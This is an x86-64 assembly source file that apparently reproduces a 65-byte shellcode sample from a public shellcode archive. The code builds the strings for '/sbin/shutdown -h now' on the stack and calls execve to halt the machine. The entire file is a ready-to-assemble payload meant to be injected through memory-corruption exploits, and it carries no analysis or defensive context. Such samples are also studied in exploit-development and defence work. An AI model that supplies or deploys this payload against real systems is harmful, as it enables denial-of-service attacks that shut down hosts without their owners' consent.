; SAMPLE TAKEN FROM : http://shell-storm.org/shellcode/files/shellcode-877.php
; shutdown -h now x86_64 Shellcode - 65 bytes

section .text

global _start

_start:

xor rax, rax
xor rdx, rdx 

push rax
push byte 0x77
push word 0x6f6e ; now
mov rbx, rsp

push rax
push word 0x682d ;-h
mov rcx, rsp

push rax
mov r8, 0x2f2f2f6e6962732f ; /sbin/shutdown
mov r10, 0x6e776f6474756873
push r10
push r8
mov rdi, rsp

push rdx
push rbx
push rcx
push rdi
mov rsi, rsp

add rax, 59
syscall